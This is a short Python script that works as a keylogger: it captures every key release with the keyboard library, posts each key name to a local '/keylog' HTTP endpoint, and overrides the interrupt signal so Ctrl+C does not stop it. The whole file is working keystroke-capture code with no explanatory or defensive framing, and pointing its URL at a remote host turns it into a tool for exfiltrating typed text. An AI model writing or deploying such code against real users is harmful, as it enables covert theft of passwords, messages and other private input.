import keyboard
import signal
import requests


def handler(signum, frame):
    print("Ignoring interrupt")
    
def send_to_server(event):
    
    url = 'http://localhost:7888/keylog'
    data = event.name.encode('utf-8')

    response = requests.post(url, data=data)
    print("\n" + response.text)
    
keyboard.on_release(send_to_server)
signal.signal(signal.SIGINT, handler)
keyboard.wait('esc')
